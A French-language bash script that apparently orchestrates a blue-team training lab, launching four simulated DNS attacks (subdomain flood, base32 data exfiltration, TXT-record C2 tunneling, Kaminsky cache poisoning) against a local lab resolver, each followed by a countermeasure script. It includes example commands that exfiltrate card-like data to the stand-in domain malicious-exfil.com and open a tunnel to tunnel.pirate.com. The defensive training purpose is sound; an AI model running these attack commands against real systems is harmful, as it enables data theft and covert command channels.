#!/bin/bash
# =============================================================================
#  DEMO MASTER - Blue Team DNSathon 2026 - Activité 3
#  Orchestre les 4 démos d'attaque + détection + contre-mesure
# =============================================================================
# Usage : bash demo_master.sh [1|2|3|4|all]
#   1 = DDoS / Water Torture
#   2 = Exfiltration de données
#   3 = DNS Tunneling
#   4 = Cache Poisoning (Kaminsky)
#   all = Toutes les démos en séquence
# =============================================================================

RESOLVER="172.28.0.2"
SCRIPTS_DIR="$(cd "$(dirname "$0")" && pwd)"
ATTAQUES_DIR="$SCRIPTS_DIR/../scripts_attaques"
DETECT_DIR="$SCRIPTS_DIR/../scripts_detection"
CM_DIR="$SCRIPTS_DIR/../scripts_contremesures"

GREEN="\033[92m"
RED="\033[91m"
YELLOW="\033[93m"
CYAN="\033[96m"
BOLD="\033[1m"
RESET="\033[0m"

separator() {
    echo -e "\n${CYAN}${BOLD}══════════════════════════════════════════════════════${RESET}"
    echo -e "${CYAN}${BOLD}  $1${RESET}"
    echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${RESET}\n"
}

check_resolver() {
    echo -e "${GREEN}[*] Vérification que le résolveur ($RESOLVER) répond...${RESET}"
    if dig @"$RESOLVER" google.com +short +time=2 > /dev/null 2>&1; then
        echo -e "${GREEN}[+] Résolveur OK.${RESET}\n"
    else
        echo -e "${RED}[!] ERREUR : Le résolveur $RESOLVER ne répond pas.${RESET}"
        echo -e "${RED}    Vérifiez que dnsaton-unbound est démarré : docker ps${RESET}"
        exit 1
    fi
}

# ─────────────────────────────────────────────────────────
demo_1_ddos() {
    separator "DÉMO 1 : DDoS / Water Torture (Random Subdomain Flood)"
    echo -e "${YELLOW}[INSTRUCTIONS]${RESET}"
    echo "  → Terminal A (détection) : déjà actif si vous avez lancé detect_engine"
    echo "  → Cette fenêtre : lancement de l'attaque puis de la contre-mesure"
    echo ""
    echo -e "${RED}[ATTAQUE]${RESET} Lancement du flood Water Torture (150 requêtes)..."
    python3 "$ATTAQUES_DIR/simul_ddos.py" \
        --dns "$RESOLVER" \
        --domain banque.bj \
        --count 150 \
        --delay 0.005
    echo ""
    echo -e "${GREEN}[CONTRE-MESURE]${RESET} Application règle iptables hashlimit..."
    bash "$CM_DIR/contre_ddos.sh"
    echo ""
    echo -e "${GREEN}[VÉRIFICATION]${RESET} Test que le trafic légitime passe encore..."
    dig @"$RESOLVER" google.com +short
}

# ─────────────────────────────────────────────────────────
demo_2_exfiltration() {
    separator "DÉMO 2 : Exfiltration de Données via DNS"
    echo -e "${RED}[ATTAQUE]${RESET} Exfiltration de données sensibles encodées Base32..."
    python3 "$ATTAQUES_DIR/simul_exfiltration.py" \
        --dns "$RESOLVER" \
        --domain malicious-exfil.com \
        --data "NUM_CB:4532015112830366 CVV:737 EXP:12/27" \
        --delay 0.3
    echo ""
    echo -e "${GREEN}[CONTRE-MESURE]${RESET} Blocage RPZ du domaine d'exfiltration..."
    bash "$CM_DIR/contre_exfiltration.sh" malicious-exfil.com
}

# ─────────────────────────────────────────────────────────
demo_3_tunneling() {
    separator "DÉMO 3 : DNS Tunneling (Canal C2)"
    echo -e "${RED}[ATTAQUE]${RESET} Établissement d'un canal C2 via requêtes TXT..."
    python3 "$ATTAQUES_DIR/simul_tunneling.py" \
        --dns "$RESOLVER" \
        --domain tunnel.pirate.com \
        --rounds 20 \
        --interval 0.4
    echo ""
    echo -e "${GREEN}[CONTRE-MESURE]${RESET} Blocage du domaine de tunnel + limite TXT..."
    bash "$CM_DIR/contre_tunneling.sh" tunnel.pirate.com
}

# ─────────────────────────────────────────────────────────
demo_4_poisoning() {
    separator "DÉMO 4 : Cache Poisoning (Kaminsky Attack)"
    echo -e "${RED}[ATTAQUE]${RESET} Bombardement Kaminsky sur la zone banque.bj..."
    python3 "$ATTAQUES_DIR/simul_poisoning.py" \
        --dns "$RESOLVER" \
        --domain banque.bj \
        --attempts 50
    echo ""
    echo -e "${GREEN}[CONTRE-MESURE]${RESET} Vérification des protections + vidage du cache..."
    bash "$CM_DIR/contre_poisoning.sh"
}

# ─────────────────────────────────────────────────────────
# MENU PRINCIPAL
# ─────────────────────────────────────────────────────────
echo -e "${BOLD}"
cat << 'BANNER'
╔══════════════════════════════════════════════════════╗
║   Blue Team Demo - DNSathon 2026 - Activité 3        ║
║   4 Attaques DNS simulées + Contre-mesures           ║
╚══════════════════════════════════════════════════════╝
BANNER
echo -e "${RESET}"

check_resolver

CHOICE="${1:-all}"

case "$CHOICE" in
    1) demo_1_ddos ;;
    2) demo_2_exfiltration ;;
    3) demo_3_tunneling ;;
    4) demo_4_poisoning ;;
    all)
        demo_1_ddos
        echo -e "\n${YELLOW}[*] Pause 3s avant la prochaine démo...${RESET}"
        sleep 3
        demo_2_exfiltration
        echo -e "\n${YELLOW}[*] Pause 3s...${RESET}"
        sleep 3
        demo_3_tunneling
        echo -e "\n${YELLOW}[*] Pause 3s...${RESET}"
        sleep 3
        demo_4_poisoning
        separator "TOUTES LES DÉMOS TERMINÉES ✓"
        echo -e "${GREEN}${BOLD}Bilan Blue Team :${RESET}"
        echo "  [+] 4 attaques simulées avec succès"
        echo "  [+] 4 détections déclenchées par le moteur IDS"
        echo "  [+] 4 contre-mesures déployées"
        ;;
    *)
        echo "Usage: bash demo_master.sh [1|2|3|4|all]"
        exit 1
        ;;
esac
